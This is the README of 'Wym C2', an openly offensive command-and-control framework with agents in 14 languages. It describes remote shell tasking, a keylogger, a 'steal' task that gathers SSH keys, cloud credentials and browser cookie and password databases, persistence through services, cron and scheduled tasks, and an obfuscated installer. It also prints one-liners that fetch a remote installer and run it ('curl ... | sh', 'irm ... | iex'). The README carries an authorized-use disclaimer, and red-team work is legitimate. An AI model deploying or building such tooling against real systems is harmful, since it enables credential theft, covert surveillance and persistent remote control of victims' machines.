# Wym C2

Wym C2 are What you missed is Command and Control Frameworks:

- **Server** — FastAPI + Jinja2 dashboard + SQLite (no external DB server needed)
- **Clients** — agents for Python, Node.js, Bash, PowerShell, Lua, PHP, Perl, Ruby
  plus compiled Go, Rust, C, C++ and C#/Java (Windows, Linux, macOS)
- **Protocol** — plain HTTP/JSON, fully documented in [`PROTOCOL.md`](PROTOCOL.md)
- **Docs** — [`AGENTS.md`](AGENTS.md) (client/agent guide), [`DEVELOPMENT.md`](DEVELOPMENT.md)
  (build & run), [`SKILL.md`](SKILL.md) (opencode skill for editing this codebase)

> [!WARNING]
> This is a dual-use security tool. You may only use it against systems you
> **own** or for which you have **explicit written authorization** (scope
> document from the asset owner). Unauthorized use is illegal in most
> jurisdictions. The operators of this project assume no liability.
>
> It contains **no evasion and no stealth**: a plain HTTP dashboard,
> plaintext-friendly wire format, and no attempt to hide from EDR/AV. It *does*
> ship operator-initiated `persistence`, `lateral`, `keylog`, `steal` and
> service-installer tasks (so Windows Defender/AMSI will flag the PowerShell
> agent) — use them only within your authorized scope.

---

## Features

- Agent registration, heartbeat/checkin, tasking, result reporting
- Task types: `shell` (per-task timeout, default 120s), `download` (push staged
  file to agent, optional destination path), `upload` (pull file from agent),
  `keylog` (start/stop/dump keystroke logger), `sleep` (change interval), `exit`
- `steal` task: collect environment variables, credential/token files
  (`~/.ssh`, aws/gcloud credentials, *rc files, …) and raw browser databases
  (Chromium `Login Data`/`Cookies`/`Web Data`, Firefox `cookies.sqlite`/
  `logins.json`/`key4.db`/`cert9.db`), then zip + upload as a single
  `steal.zip` into **Collected Files**. Profiles: `all | env | tokens | browser`.
  Raw copy only — no decryption on the agent side, so browser secrets stay
  encrypted at rest and must be cracked offline.
- `clone` task: an agent becomes a **watcher** that polls
  `GET /api/clone/status/{target}` for a target agent and runs the configured
  **relaunch command** the moment the target is `dead`/`stale` — cross-agent
  resurrection (self-heal or heal a companion). Actions:
  `start | stop | status`; optional check interval; command examples:
  `schtasks /Run /TN "C2Agent"`, `Start-Service C2Agent`, or a direct
  `python agent.py --server ... --token ...` relaunch. The relaunch command is
  run through the watcher's shell, *detached*, only while the watcher lives.
- Per-agent **note** (annotate hosts), task **re-queue** for `sent`/`failed`
  tasks, automatic retry of unacknowledged tasks after `C2_RETRY_AFTER` seconds
- **Generate Agent** page: build a ready-to-run **one-liner** for any of the 14
  languages (server URL, token, interval, jitter, payload shell pre-filled).
  All configuration is embedded **server-side into an installer script**, so the
  public one-liner stays short and carries no query parameters:
  - `curl -LsSf 'http://host/agent/python/installer.sh' | sh` (Linux/macOS)
  - `powershell -ExecutionPolicy Bypass -c "irm 'http://host/agent/python/installer.ps1' | iex"` (Windows)
  - Compiled languages can cross-compile on the server (`build on server`),
    generating a pre-built binary the installer fetches directly. Java produces
    a platform-independent **JAR** that the installer runs via `java -jar`; the
    other compiled languages (Go, Rust, C, C#, C++) produce a native binary per
    target platform.
- **Obfuscate toggle** on the Generate page: encrypts the installer body with
  AES-256-CBC. The key is **kept on the server** and fetched at runtime by the
  target via `/api/obfkey?token=...` (never embedded in the script), so the
  served script is a short decrypt-and-run stub instead of readable config.
- Jitter support on all clients (randomize the heartbeat interval)
- Authenticated dashboard (PBKDF2 password + server-side sessions)
- Shared-secret token authentication for agents (`X-Agent-Token`, also
  accepted via the `C2_TOKEN` env var)
- Auto-refreshing agent/task views, relative timestamps, status pills, agent
  filters and live metrics (total / alive / stale / dead)
- SQLite storage — zero config, one file

## Layout

```
C2/
├── server/               FastAPI app
│   ├── main.py           routes: agent API + dashboard
│   ├── database.py       SQLite schema/helpers
│   ├── auth.py           password hashing + sessions
│   ├── templates/        Jinja2 pages
│   ├── static/           CSS/JS
│   ├── shared/           files staged to push to agents (download task)
│   ├── collected/        files pulled from agents (upload task)
│   └── c2.db             SQLite database (Windows; `c2_wsl.db` on Unix — created at first start)
├── clients/              agents
│   ├── agent.py          Python  (reference implementation)
│   ├── agent.go          Go
│   ├── agent.cs          C# / .NET
│   ├── agent.rs          Rust
│   ├── agent.java        Java (JDK 11+, stdlib only)
│   ├── agent.js          Node.js
│   ├── agent.php         PHP
│   ├── agent.rb          Ruby
│   ├── agent.pl          Perl
│   ├── agent.lua         Lua
│   ├── agent.ps1         PowerShell
│   ├── agent.sh          Bash
│   ├── agent.c / agent.cpp   C / C++
│   ├── agent-service.ps1    single-file install/manage/watch any agent (Windows service/​task)
│   ├── agent-service.sh     install/manage any agent as a systemd/​launchd/​cron job
│   └── keylog_*.go       optional Go keylogger (linux/darwin/windows)
├── PROTOCOL.md           wire protocol spec (for porting to any language)
└── requirements.txt
```

---

## Server setup

The preferred path is the cross-platform installer at the repo root. It creates
the virtualenv, installs dependencies, detects the builder toolchain, starts the
server and prints the dashboard credentials.

**Windows** — `install.ps1` (ports default to **8000**, DB file `server/c2.db`):

```powershell
.\install.ps1                 # interactive: validates host/port/user, default random password
.\install.ps1 -Password "a-strong-password"   # set the dashboard password explicitly
```

**Linux / macOS / BSD / WSL** — `install.sh` (ports default to **8001**, DB file
`server/c2_wsl.db`):

```bash
./install.sh --help                    # usage
./install.sh -p "a-strong-password"    # set the dashboard password explicitly
```

Both installers accept `-Host`/`-Port`/`-User` (and `-Password`, else a random
one is generated and printed). Before writing anything they validate the
configuration, detect the **builder toolchain** (Java/Go/Rust/C/C++/.NET) for
server-side cross-compilation and print ready-to-copy install commands if a
toolchain is missing.

Virtualenvs are kept **separately per OS** to avoid WSL/Windows collisions on a
shared folder: `.venv` (Windows) and `.venv-wsl` (Linux/macOS/WSL).

To uninstall, use `uninstall.ps1` / `uninstall.sh` — each stops the server and
removes only its own platform's artifacts (`c2.db`/`c2_wsl.db`, `.agent_token`/
`.agent_token_wsl`, `.server.pid`/`.server.pid_wsl`, `.server.port`/
`.server.port_wsl`, `server.log`/`server_wsl.log`, venv, plus the
platform-neutral `builds/`; add
`-Force`/`--force` to skip the confirmation prompt).

Manual setup (equivalent to what the installer does):

```powershell
cd C2\server
python -m venv .venv                     # Windows
# python3 -m venv .venv-wsl              # Linux/macOS/WSL
.\.venv\Scripts\Activate.ps1             # Windows
# source .venv-wsl/bin/activate          # Linux/macOS/WSL
pip install -r ..\requirements.txt
python main.py                           # http://0.0.0.0:8000 (Windows) / 8001 (Unix)
```

or directly with uvicorn:

```powershell
uvicorn main:app --host 0.0.0.0 --port 8000
```

On first start the server:

1. generates a random **agent token** and writes it to
   `server/.agent_token` (Windows) / `server/.agent_token_wsl` (Unix) — keep
   that file secret,
2. creates a dashboard user and **prints the initial password to the console**
   (it is random unless you set `C2_PASSWORD`).

The database file is chosen per platform: `server/c2.db` on Windows,
`server/c2_wsl.db` elsewhere — the agent token, PID/port files, venv and log
follow the same per-OS naming (bare on Windows, `_wsl` on Unix) so a project
folder shared between Windows and WSL never collides. On every startup the
server re-syncs the default dashboard user so its password always matches the
current `C2_PASSWORD` env var.

Recommended to set explicitly:

```powershell
$env:C2_USER = "admin"
$env:C2_PASSWORD = "a-strong-password"
$env:C2_PORT = "8000"
python main.py
```

Open `http://127.0.0.1:8000/login` and sign in (port 8001 when started via
`install.sh` on Unix).

---

## Running an agent

```powershell
$token = (Get-Content server\.agent_token).Trim()   # Unix: cat server/.agent_token_wsl
python clients\agent.py --server http://127.0.0.1:8000 --token $token --interval 10 --jitter 2 --verbose
# token also accepted via env var: $env:C2_TOKEN = $token
```

Then in the dashboard:

1. Open the agent (click its hostname).
2. Task type `shell`, payload `whoami` -> Queue task (optionally override the
   timeout).
3. Watch the result appear (page auto-refreshes every 5s).

### Other languages

The 14 clients are: Python, Node.js, Bash, PowerShell, PHP, Ruby, Perl, Lua
(interpreted) and Go, Rust, C, C++, C#, Java (compiled).

```bash
# Go
cd clients && go build -o agent agent.go
./agent --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2 --verbose

# C# (.NET 6+)
dotnet new console -o a && copy clients\agent.cs a\Program.cs
dotnet build a -o out && .\out\a.exe --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2

# Rust (build server-side, or locally)
rustc -O agent.rs -o agent
./agent --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2

# Java (JDK 11+; stdlib only — no dependencies)
javac -encoding UTF-8 clients/agent.java -d out
java -cp out Agent --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
# or pre-build a JAR server-side (Generate Agent -> build on server) and run:
# java -jar agent.jar --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2

# PowerShell
powershell -ExecutionPolicy Bypass -File clients\agent.ps1 -Server http://127.0.0.1:8000 -Token <TOKEN> -Jitter 2

# Bash (needs curl + jq)
./clients/agent.sh --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2

# Node / PHP / Ruby / Perl / Lua
node clients/agent.js     --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
php  clients/agent.php    --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
ruby clients/agent.rb     --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
perl clients/agent.pl     --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
lua  clients/agent.lua    --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
```

All agents accept the token via the `C2_TOKEN` environment variable and the
server URL via `C2_SERVER` (plus `C2_INTERVAL`/`C2_JITTER`/`C2_STATE_FILE`).
The dashboard **Generate Agent** page builds a ready-to-run one-liner and the
corresponding installer for you; you normally don't need to run the clients by
hand.

See the header comment of each file for exact build steps.

### Running the agent as a service

`clients/agent-service.ps1` (Windows) and `clients/agent-service.sh` (Linux/macOS)
install and manage *any* agent in `clients/` (Python, Node, Lua, PHP, Perl, Ruby,
Bash, Java, or prebuilt C/C++/Go/Rust binaries) so it survives a reboot/logon and
restarts on crash — ideal for pairing with the `clone` watcher.

The correct runtime is auto-detected from the agent file, and the C2 flags stay
uniform: `--server URL --token TOKEN [--interval N] [--jitter N] [--verbose]`.
The scripts emit `--token=TOKEN` for parsers that need it (python/go/php/perl/ruby)
and `--token TOKEN` for raw parsers (c/cpp/csharp/java/js/lua/rs/sh) — because the
token usually starts with `-`, this matters.

Windows (`.ps1`):

```powershell
# install a Python agent (prompts for server/token if not given)
powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 install -Server http://127.0.0.1:8000 -Token <TOKEN>

# other agents / compiled sources
powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 install -Agent clients\agent.js -Lang node -Server http://127.0.0.1:8000 -Token <TOKEN>
powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 install -Agent clients\agent.c -Build -Server http://127.0.0.1:8000 -Token <TOKEN>

# backend: auto (nssm → sc → schtasks) or explicit
powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 install -Backend nssm -Server http://127.0.0.1:8000 -Token <TOKEN>

# manage
powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 start | stop | restart | status | relaunch

# remove
powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 uninstall
```

- Services/tasks are named `Wym C2 Agent <lang>` with description
  `Wym C2 are What you missed is Command and Control Frameworks`.
- `nssm` and `sc` create a real auto-start service (reboot-safe, NSSM also
  restarts after 5 s crashes) but need an **elevated** shell. `schtasks` works
  without elevation; non-elevated shells use a one-shot fallback trigger and a
  watchdog keeps the agent alive (use an elevated shell to get logon/boot
  auto-start). Passing the token is required unless `server\.agent_token` (or
  `.agent_token_wsl`) exists next to the checkout.
- `-Agent`/`-Lang`/`-Build`/`-Backend` are also accepted as `-AgentScript`.

Linux/macOS (`.sh`):

```bash
# install the Python agent as a systemd/launchd service (root on Linux)
sudo bash clients/agent-service.sh install -s http://127.0.0.1:8001 -t <TOKEN>

# other agents / compiled sources / forced backend
sudo bash clients/agent-service.sh install -a clients/agent.js -s http://127.0.0.1:8001 -t <TOKEN>
sudo bash clients/agent-service.sh install -a clients/agent.c --build -s http://127.0.0.1:8001 -t <TOKEN>
sudo bash clients/agent-service.sh install --cron -a clients/agent.js -s http://127.0.0.1:8001 -t <TOKEN>   # cron fallback
sudo bash clients/agent-service.sh install --at-boot -a clients/agent.java -s http://127.0.0.1:8001 -t <TOKEN>

# start | stop | restart | status | relaunch
sudo bash clients/agent-service.sh start
```

- Linux `systemd`: service `c2agent`, `Restart=always`, logs in `/var/log/`.
  macOS `launchd`: agent `com.c2agent.agent`, `KeepAlive` on crash.
  Re-running `install` rewrites the unit/config so a changed server/token is
  applied in place.
- `--cron` (or `-b cron`) is the no-elevation fallback: a crontab line plus a
  pidfile for clean stop/status. `--at-boot` switches the schedule to `@reboot`.

---

## Security notes (for the operator)

- Change the dashboard password immediately (`C2_PASSWORD` env var) and use HTTPS
  (terminate with a reverse proxy such as Caddy/nginx, or a self-signed cert via
  `uvicorn --ssl-keyfile --ssl-certfile`) — the protocol is HTTP and not encrypted
  by itself.
- The dashboard **does** enforce CSRF on state-changing requests (session-bound
  HMAC tokens on all POST forms). It is still designed for a trusted operator
  network, not for public exposure.
- `server/.agent_token` (Windows) / `server/.agent_token_wsl` (Unix) is a
  shared secret: rotate it by deleting the file and restarting (all agents
  must be re-registered). Installer endpoints only serve
  installers after a `Build Agent` run — they never fall back to baking the
  master token into a request, so they are not a token leak vector.
- Command execution is the entire point of the tool; restrict who can reach the
  dashboard (bind to a management interface, firewall rules, VPN).

## License / stance

Provided for security education, research, and authorized engagements. Use
responsibly.
